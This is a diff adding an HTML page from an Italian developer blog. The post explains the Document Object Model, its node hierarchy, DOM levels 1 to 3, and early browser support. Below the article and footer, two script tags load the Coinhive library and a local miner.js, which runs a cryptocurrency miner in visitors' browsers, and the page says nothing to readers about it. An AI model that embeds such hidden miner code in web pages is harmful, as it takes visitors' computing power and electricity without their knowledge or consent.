@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<script>
+		var host = "michelenasti.com";
+		if ((host == window.location.host) && (window.location.protocol != "https:"))
+			window.location.protocol = "https";
+	</script>
+	
+	<title>Il Document Object Model (DOM) - Michele Nasti's blog</title>
+	<meta name="description" content="Come abbiamo detto (nell’articolo “un breve riassunto della storia di Javascript”), Javascript è composto da tre parti:
+
+" />
+	<meta name="keywords" content="browser, document object model, dom, internet explorer, javascript, netscape" />  
+	<meta http-equiv="last-modified" content="2017-09-19 10:17:10 +0200" /> 
+	<!--<noscript>-->
+	<link rel="stylesheet" href="/css/skel.css" />
+	<link rel="stylesheet" href="/css/style.css" />
+	<link rel="stylesheet" href="/css/style-xlarge.css" />
+	<link rel="stylesheet" href="/css/colorful.css" />
+	<link rel="stylesheet" href="/css/social.css" />
+	<link rel="stylesheet" href="/node_modules/animate.css/animate.min.css" />
+	<meta name="google-site-verification" content="wpVjnRuXV99CAZxjYBzZgKbJm-8_tdLPrlP43u9zhV0" /> <!-- facebook Open Graph Metadatas -->
+<meta content="your_facebook_app_id" property="fb:app_id">
+<meta content="" property="og:site_name">
+
+
+  <meta content="Il Document Object Model (DOM)" property="og:title">
+
+
+
+  <meta content="article" property="og:type">
+
+
+
+  <meta content="I'm a full stack Developer with an eye for the web." property="og:description">
+
+
+
+  <meta content="https://michelenasti.com/2015/01/il-document-object-model-dom/" property="og:url">
+
+
+
+  <meta content="2015-01-08T09:53:26+01:00" property="article:published_time">
+  <meta content="https://www.facebook.com/micnasti/" property="article:author">
+
+
+
+<meta content="/img/logo-high-resolution.png" property="og:image">
+
+
+
+  
+  <meta content="browser" property="article:tag">
+  
+  <meta content="document object model" property="article:tag">
+  
+  <meta content="dom" property="article:tag">
+  
+  <meta content="internet explorer" property="article:tag">
+  
+  <meta content="javascript" property="article:tag">
+  
+  <meta content="netscape" property="article:tag">
+  
+
+
+<!-- Twitter cards metadatas -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@vdaubry">
+<meta name="twitter:creator" content="@micnasti">
+
+  <meta name="twitter:title" content="Il Document Object Model (DOM)">
+
+
+  <meta name="twitter:url" content="https://michelenasti.com/2015/01/il-document-object-model-dom/">
+
+
+
+  <meta name="twitter:description" content="I'm a full stack Developer with an eye for the web.">
+
+
+
+	<!--</noscript>-->
+	<!--[if lte IE 8]><link rel="stylesheet" href="/css/ie/v8.css" /><![endif]-->
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88764277-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<link rel="stylesheet" href="/css/prism.css" />
+</head>
+
+<body id="top">
+
+	<header id="header">
+	<a href="#" class="image avatar"><img src="/images/michele_nasti.jpg" alt="michele nasti volto" /></a>
+	<h1><strong><a href="/">Michele Nasti</a></strong><br /> Full-stack developer <br> with an eye for the web<br>
+	</h1>
+<a href="/chi-sono-michele-nasti/">Chi sono</a> | 
+<a href="/talks-conferences/">Talks &amp; Conferences</a> | 
+<a href="/archives/">Archives</a>
+
+</header> <div id="main">
+	<article>
+		<header class="major">
+			<h1 class="post-title"><a href="/2015/01/il-document-object-model-dom/">Il Document Object Model (DOM)</a></h1>
+			<p class="post-meta">Jan 8, 2015 • musikele</p>
+		</header>
+
+		<section>
+
+			<p>Come abbiamo detto (nell’articolo “<a href="http://michelenasti.com/2015/01/un-breve-riassunto-sulla-storia-di-javascript/">un breve riassunto della storia di Javascript</a>”), Javascript è composto da tre parti:</p>
+
+<ul>
+  <li>EcmaScript, che definisce la sintassi del linguaggio;</li>
+  <li>il Document Object Model, oggetto di questo articolo,</li>
+  <li>e il Browser Object Model, che sviscereremo nella prossima puntata.</li>
+</ul>
+
+<p>Il <strong>Document Object Model (DOM)</strong> è una API per l’XML che è stata estesa per l’HTML. il DOM mappa l’intera pagina come una gerarchia di nodi. Considerando un semplice file html, come</p>
+
+<pre><code class="language-html">&lt;html&gt;
+	&lt;head&gt;
+		&lt;title&gt;This is a title!&lt;/title&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+		Hello World!
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Questo documento viene rappresentato come un albero la cui radice è il nodo <code>&lt;html&gt;</code>, i figli di <code>&lt;html&gt;</code> sono <code>&lt;head&gt;</code> e <code>&lt;body&gt;</code>, e così via.</p>
+
+<h2 id="il-dom-è-necessario">il DOM è necessario?</h2>
+
+<p>A partire da Internet Explorer 4 e Netscape Navigator 4 (ragazzi, stiamo parlando del giurassico) questi browser iniziarono a supportare delle forme di Dynamic Html (DHTML), grazie al quale potevano modificare il contenuto di una pagina senza ricaricarla. Fu un enorme passo avanti per il web, ma anche un grande problema per gli sviluppatori: i due browser implementavano specifiche diverse, e a farne le spese spesso erano gli utenti. (I problemi non si risolvevano dicendo “vabbè, ora scarico l’altro browser e vedo come si vede la pagina”… Internet era leeeeentiiiiisssiiiiiimooooooo). Siccome non si poteva attendere che uno dei due browser vincesse sull’altro, e per preservare la natura “aperta” del web, il W3C (ente che sovrintende le regole del web) decise di standardizzare il DOM.</p>
+
+<h2 id="dom-levels">DOM levels</h2>
+
+<p>Il <strong>DOM di livello 1</strong> divenne uno standard nel 1998. Era composto da due parti: il <em>Core</em>, che forniva gli strumenti per mappare un documento XML, e per fare ricerche e manipolazione al suo interno; e il <em>DOM HTML</em>, un’estensione del Core, che aggiungeva metodi specifici per l’HTML. Da notare che i DOM non è specifico a Javascript ma anzi è stato implementato in altri linguaggi.</p>
+
+<p>Con il <strong>DOM di livello 2</strong> si puntava ad aggiungere funzionalità al DOM di primo livello. Fu aggiunto il supporto per il Mouse, per gli eventi della UI, iteratori per poter attraversare il documento, e il supporto per i CSS.</p>
+
+<p>Il <strong>DOM di livello 3</strong> continua ad estendere le funzionalità dei DOM precedenti e introduce anche metodi per il caricamento e il salvataggio dei documenti, e metodi per la validazione. Nel DOM Level 3, il Core è esteso per essere compatibile con tutto lo standard XML 1.0.</p>
+
+<blockquote>
+  <p>Alcuni parlano anche di <strong>DOM livello 0</strong>, che non è mai stato uno standard, ma anzi rappresenta solo ciò che era il DOM all’epoca di IE4 e NN4.</p>
+</blockquote>
+
+<p>Esistono anche altri DOM tarati per altri linguaggi, come SVG, MathML, SMIL, e anche Mozilla ha un suo DOM per la sua interfaccia grafica (XUL). Se volete approfondire Google è vostro amico.</p>
+
+<h2 id="e-i-browser">E i Browser?</h2>
+
+<p>Internet Explorer ha iniziato ad avere un supporto del DOM level 1 a partire dalla versione 5.5 . Fino alla versione 8 non è cambiato granchè, per avere nuove funzionalità conviene partire da IE9. Netscape senza che ne parliamo visto che si è estinto, ma è bene sapere che Firefox dalla versione 3 in poi supporta il Level 1, una grande parte del Level 2, e alcune parti del level 3.</p>
+
+<p>Ci vediamo alla prossima puntata per parlare dello sconosciutissimo BOM !</p>
+ 
+<ul class="share-buttons">
+  <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://michelenasti.com/2015/01/il-document-object-model-dom/&t=" title="Share on Facebook" target="_blank" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(https://michelenasti.com/2015/01/il-document-object-model-dom/) + '&t=' + encodeURIComponent(document.title)); return false;"><img alt="Share on Facebook" src="/images/icons/Facebook.svg"></a></li>
+  <li><a href="https://twitter.com/intent/tweet?source=https://michelenasti.com/2015/01/il-document-object-model-dom/&text=Il Document Object Model (DOM):%20https://michelenasti.com/2015/01/il-document-object-model-dom/&via=micnasti" target="_blank" title="Tweet" onclick="window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(Il Document Object Model (DOM)) + ':%20'  + encodeURIComponent(https://michelenasti.com/2015/01/il-document-object-model-dom/)); return false;"><img alt="Tweet" src="/images/icons/Twitter.svg"></a></li>
+  <li><a href="https://plus.google.com/share?url=https://michelenasti.com/2015/01/il-document-object-model-dom/" target="_blank" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=' + encodeURIComponent(https://michelenasti.com/2015/01/il-document-object-model-dom/)); return false;"><img alt="Share on Google+" src="/images/icons/Google+.svg"></a></li>
+  <li><a href="http://www.linkedin.com/shareArticle?mini=true&url=https://michelenasti.com/2015/01/il-document-object-model-dom/&title=Il Document Object Model (DOM)&summary=&source=https://michelenasti.com/2015/01/il-document-object-model-dom/" target="_blank" title="Share on LinkedIn" onclick="window.open('http://www.linkedin.com/shareArticle?mini=true&url=' + encodeURIComponent(https://michelenasti.com/2015/01/il-document-object-model-dom/) + '&title=' +  encodeURIComponent(document.title)); return false;"><img alt="Share on LinkedIn" src="/images/icons/LinkedIn.svg"></a></li>
+</ul>
+
+		</section>
+
+		<section>
+			 <div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+    	//var disqus_identifier = 'https://michelenasti.com';
+			//var disqus_url = '';
+			var disqus_url = 'https://michelenasti.com/2015/01/il-document-object-model-dom/';
+			var disqus_identifier = 'https://michelenasti.com/2015/01/il-document-object-model-dom/';
+
+    };
+    
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//michele-nastis-blog.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> 
+		</section>
+
+		<footer>
+			<br> Altri articoli:
+			<br>
+			<div class="row">
+				
+
+				<div class="6u 12u(small) excerpt" id="previousArticle">
+					<header>
+						<h2><a href="/2015/01/un-breve-riassunto-sulla-storia-di-javascript/">Un breve riassunto sulla storia di Javascript</a></h2>
+					</header>
+					<section>
+						<p>Javascript è un linguaggio ideato da <a href="http://en.wikipedia.org/wiki/Brendan_Eich" title="Brendan Eich">Brendan Eich</a>, che all’epoca lavorava in Netscape. Il principale utilizzo di Javascript doveva essere quello di evitare rimbalzi di richeste / risposte da client a server solo per delle banali validazioni nei form. All’epoca, nel 1995, caricare una pagina poteva costare tantissimo e vedersela ritornare indietro con la scritta “devi accettare questa clausola per continuare” poteva essere moooolto costoso.</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="/2015/01/un-breve-riassunto-sulla-storia-di-javascript/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				 
+
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
+					<header>
+						<h2><a href="/2015/01/chiamare-una-funzione-javascript-subito-dopo-averla-definita/">chiamare una funzione Javascript subito dopo averla definita</a></h2>
+					</header>
+					<section>
+						<p>Consideriamo il seguente esempio:</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="//2015/01/chiamare-una-funzione-javascript-subito-dopo-averla-definita/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				
+			</div>
+		</footer>
+
+	</article>
+
+</div>
+<script src="/js/infinite-scroll.js"></script>
+
+	<!-- Footer -->
+	<footer id="footer">
+	<ul class="icons">
+
+		
+		<li>
+			<a href="https://github.com/musikele" class="icon fa-github">
+				<span class="label">GitHub</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://twitter.com/micnasti" class="icon fa-twitter">
+				<span class="label">Twitter</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://linkedin.com/in/michelenasti" class="icon fa-linkedin">
+				<span class="label">LinkedIn</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://plus.google.com/MicheleNasti" class="icon fa-google-plus">
+				<span class="label">Google+</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://www.facebook.com/musikele" class="icon fa-facebook">
+				<span class="label">Facebook</span>
+			</a>
+		</li>
+		  
+	</ul>
+	<ul class="copyright">
+		<li>&copy; Michele Nasti</li>
+		<li>Based on <a href="http://html5up.net/strata">STRATA</a> theme</li>
+	</ul>
+</footer>
+	<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
+	<script src="/js/jquery.min.js"></script>
+	<script src="/js/jquery.poptrox.min.js"></script>
+	<script src="/js/skel.min.js"></script>
+	<script src="/js/init.js"></script>
+	<script src="/js/prism.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/js/miner.js"></script>
+	<!-- <script src="/js/badge.js"></script> -->
+</body>
+
+</html>
